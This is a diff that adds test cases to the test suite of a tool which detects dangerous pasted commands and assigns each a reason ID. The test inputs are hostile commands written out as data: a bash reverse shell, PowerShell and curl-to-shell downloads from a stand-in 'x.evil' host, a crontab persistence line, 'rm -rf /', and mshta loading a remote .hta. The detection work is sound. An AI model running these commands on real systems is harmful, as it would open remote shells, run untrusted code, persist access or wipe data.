@@ -416,6 +416,15 @@ jcheck "P8 tier: file-upload exfil scores 55" 'd["score"] == 55' paste 'curl -X 
 jcheck "P8: defanged hxxps still counts as remote" 'd["score"] == 65' paste 'mshta.exe hxxps://files.example.net/captcha.hta'
 jcheck "P8: benign pkg-mgr install stays ALERT band" 'd["score"] == 45' paste 'brew install wget'
 
+# reason_ids: per-block stable dedup keys (HLSE-PASTE-P<n>) — cycle-478.
+# P9/P10 kept their original meanings; the later colliding blocks moved
+# to P16/P17 so no code carries two detection meanings.
+jcheck "reason_ids: multi-block emits all block ids" 'd.get("reason_ids") == ["HLSE-PASTE-P2","HLSE-PASTE-P8","HLSE-PASTE-P16"]' paste 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 && powershell -enc http://x.evil/a.ps1 && curl http://x | sh'
+jcheck "reason_ids: destructive payload keeps P9" 'd.get("reason_ids") == ["HLSE-PASTE-P9"]' paste 'rm -rf /'
+jcheck "reason_ids: persistence injection is P17" 'd.get("reason_ids") == ["HLSE-PASTE-P2","HLSE-PASTE-P11","HLSE-PASTE-P17"]' paste 'echo "* * * * * curl http://x.evil/a.sh | sh" | crontab -'
+jcheck "reason_ids: uncoded compound falls back to OTHER" 'd.get("reason_ids") == ["HLSE-PASTE-P2","HLSE-PASTE-P4","HLSE-PASTE-OTHER"]' paste 'sudo curl http://x.evil/a.sh | sudo sh'
+jcheck "reason_ids: clean paste emits empty array" 'd.get("reason_ids") == []' paste 'echo hello'
+
 # P8 (also:) overflow guard: 5 hits with 105-141-char labels must not
 # smash extra[192] — cycle-439 fixed a would-be-length advance that
 # underflowed the snprintf size (ASan stack-buffer-overflow).
